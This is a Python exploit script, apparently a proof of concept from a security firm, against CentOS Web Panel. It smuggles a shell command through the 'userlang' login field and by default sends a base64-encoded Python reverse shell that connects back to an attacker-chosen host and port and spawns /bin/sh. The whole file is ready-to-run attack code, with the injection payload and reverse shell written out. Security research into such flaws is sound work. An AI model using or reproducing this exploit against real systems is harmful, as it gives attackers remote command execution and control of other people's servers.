# Copyright (C) 2022 Kev Breen, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import hashlib
from itsdangerous import base64_encode
import requests
import urllib3

from base64 import b64encode
from datetime import datetime

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

session = requests.session()



if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='User Account Hijack CentOS Web Panel')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--username',
        help='Username of the account to hijack',
        required=True)

    parser.add_argument(
        '--password',
        help="New Password to set for the account",
        required=True,
        default=None
    )

    parser.add_argument(
        '--lhost',
        help='IP address or hostname the shell will connect back to',
        required=False)

    parser.add_argument(
        '--lport',
        help='Port listening for the shell',
        required=False)

    parser.add_argument(
        '--command',
        help="Overide default reverse shell with custom command",
        required=False,
        default=None
    )

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true'
    )


    args = parser.parse_args()

    if args.proxy:
        session.proxies.update(proxies)

    target_url = f'https://{args.target}:2083/login/index.php?acc=validate'

    print(f'[+] Sending Auth RCE Request to Target')

    # Password needs to be encoded.
    password = b64encode(args.password.encode())

    if args.command:
        payload_command = f"en' | {args.command} |'en"
    else:
        python_payload = f'import socket,os,pty;\
            s=socket.socket();\
            s.connect(("{args.lhost}",{args.lport}));\
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
            pty.spawn("/bin/sh")'
        
        python_payload = base64_encode(python_payload).decode()

        payload_command = f"' | python -c \"`echo {python_payload} | base64 -d `\" | echo 'en"

    post_data = {
        "username": args.username,
        "password": password,
        "sessioning": 0,
        "userlang": payload_command

    }

    response = session.post(target_url, data=post_data, verify=False)

